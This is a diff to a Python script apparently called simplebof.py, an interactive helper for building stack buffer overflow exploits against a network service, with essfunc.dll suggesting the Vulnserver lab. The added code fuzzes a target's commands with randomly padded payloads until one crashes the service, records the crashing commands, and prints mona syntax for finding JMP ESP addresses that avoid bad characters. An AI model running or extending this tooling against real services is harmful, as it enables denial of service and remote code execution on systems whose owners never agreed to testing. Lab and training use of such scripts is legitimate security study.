@@ -1,7 +1,8 @@
 #!/bin/python3
 
-import sys, socket, os, subprocess, re
+import sys, socket, os, subprocess, re, string, random
 from time import sleep
+from nclib import Netcat as nc
 
 if len(sys.argv) < 3:
     print("usage: ./simplebof.py [ip] [port]")
@@ -17,6 +18,7 @@ crashbytes = ""
 offset_value = ""
 address = ""
 final_badchars = "\\x00"
+final_cmd_set = set()
 
 #-----Global variables-----
 
@@ -75,12 +77,133 @@ def main_menu_selection():
     else:
         print("Invalid selection.")
         main_menu_selection()
-        
+
 def spike():
-    end_of_process_selection("spike","Work in Progress...")
+    global final_cmd_set
+
+    check_variables("")
+
+    clear()
+    
+    cmd_set = set()
+
+    print("Use ctrl + c to exit if unable to exit from program\n\n")
+
+    connect = nc((rhost, int(rport)))
+    connect.interact()
+
+    y = 0
+    cmds = input("\nEnter list of command(s) to test(e.g. cmd1 cmd2 ): ")
+
+    max_packet = input("Max packets to send(Default: 248): ")
+    if max_packet == "":
+        max_packet = 248
+
+    for i in cmds.split():
+        cmd_set.add(i.strip())
+
+    def special_chars():
+        random_length = random.randrange(0,6)
+        return "".join(random.choices(string.punctuation, k=random_length))
+
+    while True:
+        try:
+            cmds = list(cmd_set)
+            for i in cmds:
+                no_pad_packets = int(max_packet) // 10
+                if len(cmd_set) > 0:
+                    clear()
+                    cmd1 = i
+                    y = 0
+                    for x in range (0,max_packet):
+                        cmd = cmd1 + " "
+                        if x > no_pad_packets:
+                            cmd2 = special_chars()
+                            cmd = cmd1 + " " + cmd2
+                        else:
+                            cmd = cmd1 + " "
+
+                        z = random.randrange(1,9999)
+                        buffer = b"0" * z
+                        payload = cmd.encode() + buffer
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((rhost,int(rport)))
+
+                        print (f"[+] Testing {cmd1} : payload {x+1} of {max_packet} : {len(payload)} bytes")
+                        
+                        s.send(payload)
+                        s.settimeout(1)
+                        s.recv(64)
+                        s.close()
+                        y += 1
+
+                    cmd_set.remove(i)
+
+            clear()
+
+            if len(final_cmd_set) == 0:
+                print("All commands tested.\nNothing crash the program.")
+            break
+
+        except KeyboardInterrupt:
+            cmd_set.remove(i)
+            if len(cmd_set) > 0:
+                pass
+            else:
+                if len(final_cmd_set) == 0:
+                    clear()
+                    print("All commands tested.\nNothing crash the program.")
+                break
+        except socket.timeout:
+            if y < 1:
+                print ("Error connecting to server")
+                break
+            else:
+                print(f"Done.\n\n{cmd1} crash the program.")
+                cmd_set.remove(i)
+                cmd_add = input("Check Immunity EAX for final command.\nCommand: ")
+                final_cmd_set.add(cmd_add)
+                while True:
+                    clear()
+                    selection = input("Test another command?(y/n): ")
+                    if selection.strip().lower() == "y" or selection.strip().lower() == "n":
+                        break
+                    else:
+                        print("Wrong input")
+                if selection.strip().lower() == "y":
+                    clear()
+                    if len(cmd_set) > 0:           
+                        input("\nCheck immunity is running before continuing.\nPress enter to continue.")
+                        pass
+                    else:
+                        print("No more commands to test.\n")
+                        break
+                if selection.strip().lower() == "n":
+                    clear()
+                    break
+        except socket.error:
+            if y < 1:
+                print ("Error connecting to server")
+                break
+            else:
+                print(f"Done.\n\n{cmd1} crash the program.")
+                print("All commands Tested")
+                cmd = input("Check Immunity EAX for final command.\nCommand: ")
+                break     
+
+    if len(final_cmd_set) > 0:
+        print("Command(s) that crash the program:\n")
+        for i in final_cmd_set:
+            print(i)
+    input("\nPress enter to continue... ")
+    end_of_process_selection("spike")
     
 def fuzz():
-    global crashbytes
+    global crashbytes, cmd
+
+    if len(final_cmd_set) == 1:
+        for i in final_cmd_set:
+            cmd = i
     
     check_variables("cmd")
 
@@ -234,7 +357,6 @@ def find_badchars():
     except socket.error:
         end_of_process_selection("badchars", "Error connecting to server")
 
-
 def find_module():
 
     global address, final_badchars
@@ -247,13 +369,14 @@ def find_module():
     print("Identify module in Immunity")
     print("mona syntax: !mona modules\n")
     print("Find JMP address of modules")
-    print("mona syntax: !mona jmp -r ESP -m \"<module>\"")
+    print("mona syntax: !mona jmp -r ESP -m \"<module>\" or")
+    print("mona syntax: !mona jmp -r ESP -cpb \"<bad characters>\"")
     print("\nExample:")
     print("usage: !mona modules")
-    print("With process")
-    print("usage: !mona jmp -r ESP -m \"essfunc.dll\"")
-    print("With bad characters")
-    print(f"usage: !mona jmp -r ESP -cpb \"{final_badchars}\"")
+    if len(final_badchars) == 4: 
+        print("usage: !mona jmp -r ESP -m \"essfunc.dll\"")
+    if len(final_badchars) > 4:
+        print(f"usage: !mona jmp -r ESP -cpb \"{final_badchars}\"")
     address = input("\nPlease enter the address of the process/function: ")
     address_new = address
 
@@ -447,6 +570,10 @@ def options_menu():
     print(f"7. Exit")
     print(f"\nPayload crash at: {crashbytes}")
     print(f"\nBad characters: {final_badchars}")
+    print(f"\nVunerable Commands:\n")
+    if len(final_cmd_set) > 0:
+        for i in final_cmd_set:
+            print(i)
     options_selection()
 
 #-----Menu END-----
